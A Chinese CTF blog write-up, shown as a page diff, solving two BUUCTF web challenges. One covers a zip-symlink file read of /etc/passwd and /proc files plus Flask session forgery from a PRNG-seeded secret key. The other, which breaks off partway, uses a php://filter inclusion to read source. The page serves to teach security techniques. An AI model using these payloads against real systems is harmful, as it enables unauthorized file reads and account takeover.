@@ -1,0 +1,756 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Yu ting">
+  <meta name="keywords" content="">
+  <title>buu（七） - liquor&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"liquor-boop.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="buu（七）">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-08-07 17:03" pubdate>
+        August 7, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      2.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      43
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">buu（七）</h1>
+            
+            <div class="markdown-body">
+              <h1>[HCTF 2018]Hideandseek</h1>
+<p>知识点：</p>
+<ul>
+<li><strong>zip 软链接实现任意文件读取</strong></li>
+<li><strong>linux系统目录</strong></li>
+<li><strong>flask session伪造</strong></li>
+</ul>
+<p>没有注册功能，直接登录，需要上传zip文件，随便传一个，发现他会直接读取回显：</p>
+<p><img src="/2021/08/07/hate/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>利用点应该就是用zip去读文件。</p>
+<h4 id="软链接读取文件"><a class="header-anchor" href="#软链接读取文件">🍭</a>软链接读取文件</h4>
+<p>这个利用点来自脸书的一个读取漏洞。软链接又叫符号链接，用<code>ln -s</code>创建。这个链接包含了另一个文件的路径名：它可以是任意文件或目录，可以链接不同文件系统的文件。就像是是win下的快捷方式。</p>
+<p>用法：</p>
+<pre><code class="hljs excel"><span class="hljs-built_in">ln</span> -s 源文件 目标文件</code></pre>
+<p>比如我们要读/etc/passwd，可以创建一个软链接：</p>
+<pre><code class="hljs awk">ln -s <span class="hljs-regexp">/etc/</span>passwd link</code></pre>
+<p>压缩文件，同时保留链接</p>
+<pre><code class="hljs stata"><span class="hljs-keyword">zip</span> --symlinks <span class="hljs-keyword">test</span>.<span class="hljs-keyword">zip</span> link   #symlinks是kali/Ubuntu下维持软链接（符号链接）的命令</code></pre>
+<p>然后上传test.zip文件，系统会自动解压缩，页面当中会返回/etc/passwd的内容。</p>
+<h4 id="思路"><a class="header-anchor" href="#思路">🍭</a>思路</h4>
+<p>之前在登录的时候admin回显you are not admin，观察一下session</p>
+<p><img src="/2021/08/07/hate/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>解码：{“username”: “1”}，应该是要flask-session伪造了，猜测要用软链接读取相关文件使得可以用admin身份登录（毕竟好多题目都这样），所以接下来就是要通过软链接获取SECRET_KEY。</p>
+<h4 id="解题"><a class="header-anchor" href="#解题">🍭</a>解题</h4>
+<p>生成<code>/proc/self/environ</code>的软链接，压缩后上传，得到flask的环境变量，没研究出什么有用的，看了WP，里面有一个配置文件：</p>
+<p><img src="/2021/08/07/hate/7.png" srcset="/img/loading.gif" alt="7"></p>
+<blockquote>
+<p>uWSGI是一个Web应用服务器，它具有应用服务器，代理，进程管理及应用监控等功能。它支持WSGI协议，同时它也支持自有的uWSGI协议.</p>
+</blockquote>
+<p>读一下：</p>
+<p><img src="/2021/08/07/hate/8.png" srcset="/img/loading.gif" alt="8"></p>
+<p>WP说这个题目有bug，原题源码在这个目录下：<code>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py</code>，buu环境没弄好，只显示了main，读一下得到源码：</p>
+<pre><code class="hljs vim"># -*- codin<span class="hljs-variable">g:</span> utf-<span class="hljs-number">8</span> -*-
+from flask import Flask,session,render_template,redirect, url_for, <span class="hljs-built_in">escape</span>, request,Response
+import uuid
+import base64
+import random
+import flag
+from werkzeug.utils import secure_filename
+import os
+random.seed(uuid.getnode())
+app = Flask(__name__)
+app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = str(random.random()*<span class="hljs-number">100</span>)
+app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="hljs-string">&#x27;./uploads&#x27;</span>
+app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="hljs-number">100</span> * <span class="hljs-number">1024</span>
+ALLOWED_EXTENSIONS = <span class="hljs-keyword">set</span>([<span class="hljs-string">&#x27;zip&#x27;</span>])
+
+def allowed_file(filename):
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> in filename <span class="hljs-built_in">and</span> \
+           filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])
+def <span class="hljs-built_in">index</span>():
+    error = request.<span class="hljs-keyword">args</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)
+    <span class="hljs-keyword">if</span>(error == <span class="hljs-string">&#x27;1&#x27;</span>):
+        session.<span class="hljs-keyword">pop</span>(<span class="hljs-string">&#x27;username&#x27;</span>, None)
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, forbidden=<span class="hljs-number">1</span>)
+
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> in session:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, user=session[<span class="hljs-string">&#x27;username&#x27;</span>], flag=flag.flag)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)
+
+
+@app.route(<span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])
+def login():
+    username=request.form[<span class="hljs-string">&#x27;username&#x27;</span>]
+    password=request.form[<span class="hljs-string">&#x27;password&#x27;</span>]
+    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span> <span class="hljs-built_in">and</span> username != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-built_in">and</span> password != <span class="hljs-string">&#x27;&#x27;</span>:
+        <span class="hljs-keyword">if</span>(username == <span class="hljs-string">&#x27;admin&#x27;</span>):
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>,error=<span class="hljs-number">1</span>))
+        session[<span class="hljs-string">&#x27;username&#x27;</span>] = username
+    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+
+
+@app.route(<span class="hljs-string">&#x27;/logout&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>])
+def logout():
+    session.<span class="hljs-keyword">pop</span>(<span class="hljs-string">&#x27;username&#x27;</span>, None)
+    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+
+@app.route(<span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>])
+def upload_file():
+    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;the_file&#x27;</span> not in request.<span class="hljs-keyword">file</span><span class="hljs-variable">s:</span>
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+    <span class="hljs-keyword">file</span> = request.<span class="hljs-keyword">files</span>[<span class="hljs-string">&#x27;the_file&#x27;</span>]
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span>.filename == <span class="hljs-string">&#x27;&#x27;</span>:
+        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">file</span> <span class="hljs-built_in">and</span> allowed_file(<span class="hljs-keyword">file</span>.filename):
+        filename = secure_filename(<span class="hljs-keyword">file</span>.filename)
+        file_save_path = os.path.<span class="hljs-keyword">join</span>(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)
+        <span class="hljs-keyword">if</span>(os.path.<span class="hljs-built_in">exists</span>(file_save_path)):
+            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;This file already exists&#x27;</span>
+        <span class="hljs-keyword">file</span>.save(file_save_path)
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;This file is not a zipfile&#x27;</span>
+
+
+    <span class="hljs-keyword">try</span>:
+        extract_path = file_save_path + <span class="hljs-string">&#x27;_&#x27;</span>
+        os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;unzip -n &#x27;</span> + file_save_path + <span class="hljs-string">&#x27; -d &#x27;</span>+ extract_path)
+        read_obj = os.popen(<span class="hljs-string">&#x27;cat &#x27;</span> + extract_path + <span class="hljs-string">&#x27;/*&#x27;</span>)
+        <span class="hljs-keyword">file</span> = read_obj.<span class="hljs-keyword">read</span>()
+        read_obj.<span class="hljs-keyword">close</span>()
+        os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&#x27;rm -rf &#x27;</span> + extract_path)
+    except Exception <span class="hljs-keyword">as</span> <span class="hljs-keyword">e</span>:
+        <span class="hljs-keyword">file</span> = None
+
+    os.<span class="hljs-built_in">remove</span>(file_save_path)
+    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span> != None):
+        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">file</span>.<span class="hljs-keyword">find</span>(base64.b64decode(<span class="hljs-string">&#x27;aGN0Zg==&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) != -<span class="hljs-number">1</span>):
+            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>, error=<span class="hljs-number">1</span>))
+    <span class="hljs-keyword">return</span> Response(<span class="hljs-keyword">file</span>)
+
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    #app.run(<span class="hljs-keyword">debug</span>=True)
+    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-keyword">debug</span>=True, port=<span class="hljs-number">10008</span>)</code></pre>
+<p>可以看到flag在<code>/app/flag.py</code>文件里，试了一下软链接读不了，只能找<code>SECRET_KEY</code>了，源码中：</p>
+<p><code>app.config['SECRET_KEY'] = str(random.random()*100)</code></p>
+<p>SECRET_KEY随机生成，但给了种子：</p>
+<p><code>random.seed(uuid.getnode())</code></p>
+<p>之前讲过random生成的数不是真正的随机数，而是伪随机数，利用伪随机数的特性，只要种子是一样的，后面产生的随机数值也会一致。</p>
+<p><img src="/2021/08/07/hate/9.png" srcset="/img/loading.gif" alt="9"></p>
+<p>mac地址怎么获得</p>
+<p><img src="/2021/08/07/hate/10.png" srcset="/img/loading.gif" alt="10"></p>
+<p>读/sys/class/net/eth0/address得mac地址：02:42:ac:10:87:3d</p>
+<p>用脚本处理</p>
+<pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">uuid</span>
+<span class="hljs-keyword">import</span> random
+
+mac = &quot;02:42:ac:10:87:3d&quot;
+<span class="hljs-keyword">temp</span> = mac.split(<span class="hljs-string">&#x27;:&#x27;</span>)
+<span class="hljs-keyword">temp</span> = [<span class="hljs-type">int</span>(i,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">temp</span>]
+<span class="hljs-keyword">temp</span> = [bin(i).replace(<span class="hljs-string">&#x27;0b&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).zfill(<span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-keyword">temp</span>]
+<span class="hljs-keyword">temp</span> = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>(<span class="hljs-keyword">temp</span>)
+mac = <span class="hljs-type">int</span>(<span class="hljs-keyword">temp</span>,<span class="hljs-number">2</span>)
+random.seed(mac)
+randStr = str(random.random()*<span class="hljs-number">100</span>)
+print(randStr) 
+#得<span class="hljs-number">85.57286294786866</span></code></pre>
+<p>伪造一下</p>
+<p><img src="/2021/08/07/hate/11.png" srcset="/img/loading.gif" alt="11"></p>
+<p>替换</p>
+<img src="/2021/08/07/hate/12.png" srcset="/img/loading.gif" alt="12" style="zoom:50%;">
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freesion.com/article/14231062121/">https://www.freesion.com/article/14231062121/</a></p>
+<h1>[极客大挑战 2020]Roamphp2-Myblog</h1>
+<p>题目有一个登陆界面，但是尝试了一下注入不了；测试一圈发现不管访问什么界面，url都是<code>?page=xxx</code>，试一下伪协议读取源码：<code>?page=php://filter/read=convert.base64-encode/resource=login.php </code>,读取不出来，但是首页url的末尾是<code>?page=home</code>，没有后缀，试试去掉<code>.php</code>：</p>
+<p><img src="/2021/08/07/hate/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>解码一下，login.php：</p>
+<pre><code class="hljs php-template"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span></span>
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span>
+<span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;robots&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;all,follow&quot;</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://ajax.aspnetcdn.com/ajax/bootstrap/4.2.1/css/bootstrap.min.css&quot;</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;css/style.default.css&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;theme-stylesheet&quot;</span>&gt;</span></span>
+<span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span>
+<span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span>
+<span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;page login-page&quot;</span>&gt;</span></span>
+<span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container d-flex align-items-center&quot;</span>&gt;</span></span>
+<span class="xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-holder has-shadow&quot;</span>&gt;</span></span>
+<span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;row&quot;</span>&gt;</span></span>
+<span class="xml">            <span class="hljs-comment">&lt;!-- Logo &amp; Information Panel--&gt;</span></span>
+<span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6&quot;</span>&gt;</span></span>
+<span class="xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;info d-flex align-items-center&quot;</span>&gt;</span></span>
+<span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span>
+<span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;logo&quot;</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎登录<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span>
+<span class="xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>—— 博客后台 ——<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
+<span class="xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">            <span class="hljs-comment">&lt;!-- Form Panel    --&gt;</span></span>
+<span class="xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;col-lg-6 bg-white&quot;</span>&gt;</span></span>
+<span class="xml">              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form d-flex align-items-center&quot;</span>&gt;</span></span>
+<span class="xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span>
+<span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/?page=admin/user&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-validate&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;loginFrom&quot;</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span></span>
+<span class="xml">                      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login-username&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">data-msg</span>=<span class="hljs-string">&quot;请输入用户名&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;用户名&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-material&quot;</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span></span>
+<span class="xml">                      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login-password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">required</span> <span class="hljs-attr">data-msg</span>=<span class="hljs-string">&quot;请输入密码&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;input-material&quot;</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-primary&quot;</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
+<span class="xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-top: -40px;&quot;</span>&gt;</span> </span>
+<span class="xml">                    	<span class="hljs-comment">&lt;!-- &lt;input type=&quot;checkbox&quot;  id=&quot;check1&quot;/&gt;&amp;nbsp;&lt;span&gt;记住密码&lt;/span&gt;</span></span>
+<span class="xml">                    	<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check2&quot;</span>/&gt;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>自动登录<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> --&gt;</span>
+<span class="xml">                    	<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control custom-checkbox &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right;&quot;</span>&gt;</span></span>
+<span class="xml">											    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check2&quot;</span> &gt;</span></span>
+<span class="xml">											    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-label&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;check2&quot;</span>&gt;</span>自动登录<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span>
+<span class="xml">											<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">											<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control custom-checkbox &quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;float: right;&quot;</span>&gt;</span></span>
+<span class="xml">											    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-input&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;check1&quot;</span> &gt;</span></span>
+<span class="xml">											    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;custom-control-label&quot;</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;check1&quot;</span>&gt;</span>记住密码<span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-symbol">&amp;nbsp;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span>
+<span class="xml">											<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span> </span>
+<span class="xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
+<span class="xml">                  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
+<span class="xml">                  <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span>
